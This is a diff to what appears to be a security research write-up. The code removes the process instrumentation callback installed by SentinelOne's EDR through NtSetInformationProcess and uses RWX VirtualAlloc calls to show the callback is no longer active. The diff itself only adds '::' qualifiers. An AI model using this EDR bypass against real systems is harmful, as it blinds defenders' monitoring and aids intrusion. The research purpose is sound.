@@ -50,7 +50,7 @@ We can configure the return address of the syscall to wherever we want and deter
 
 ```cpp
     LONG    Status         = STATUS_SUCCESS;
-    HANDLE  ProcessHandle  = GetCurrentProcess();
+    HANDLE  ProcessHandle  = ::GetCurrentProcess();
 
     PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstCallbackInfo = { 0 };
   
@@ -58,7 +58,7 @@ We can configure the return address of the syscall to wherever we want and deter
     InstCallbackInfo.Reserved = 0;
     InstCallbackInfo.Version  = 0;
 
-    Status = NtSetInformationProcess(
+    Status = ::NtSetInformationProcess(
         ProcessHandle, (PROCESS_INFORMATION_CLASS)ProcessInstrumentationCallback,
         (PVOID)&InstCallbackInfo, sizeof( InstCallbackInfo )
     );
@@ -73,10 +73,10 @@ auto WINAPI WinMain(
     _In_ INT       ShowCmd
 ) -> INT {
     NTSTATUS NTAPI ( *NtSetInformationProcess )( _In_ HANDLE ProcessHandle, _In_ PROCESS_INFORMATION_CLASS ProcessInformationClass, _In_ PVOID ProcessInformation, _In_ ULONG ProcessInformationLength );
-    NtSetInformationProcess = ( decltype( NtSetInformationProcess ) )GetProcAddress( GetModuleHandleA( "ntdll.dll" ), "NtSetInformationProcess" );
+    NtSetInformationProcess = ( decltype( NtSetInformationProcess ) )::GetProcAddress( ::GetModuleHandleA( "ntdll.dll" ), "NtSetInformationProcess" );
 
     LONG    Status         = STATUS_SUCCESS;
-    HANDLE  ProcessHandle  = GetCurrentProcess();
+    HANDLE  ProcessHandle  = ::GetCurrentProcess();
 
     PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstCallbackInfo = { 0 };
 
@@ -84,15 +84,15 @@ auto WINAPI WinMain(
     InstCallbackInfo.Reserved = 0;
     InstCallbackInfo.Version  = 0;
 
-    VirtualAlloc( 0, 1000, 0x3000, 0x40 );
+    ::VirtualAlloc( 0, 1000, 0x3000, 0x40 );
 
-    Status = NtSetInformationProcess(
+    Status = ::NtSetInformationProcess(
         ProcessHandle, (PROCESS_INFORMATION_CLASS)ProcessInstrumentationCallback,
         (PVOID)&InstCallbackInfo, sizeof( InstCallbackInfo )
     );
     if ( Status != STATUS_SUCCESS ) return;
 
-    VirtualAlloc( 0, 1000, 0x3000, 0x40 );
+    ::VirtualAlloc( 0, 1000, 0x3000, 0x40 );
 }
 ```
 I overwrite the callback, effectively removing the one previously added by SentinelOne. Before doing that, I use `kernel32!VirtualAlloc` just to demonstrate its execution with the callback still active. Then, I call `kernel32!VirtualAlloc` again after removing the callback to show that it’s no longer in effect. Below is a demonstration video:  
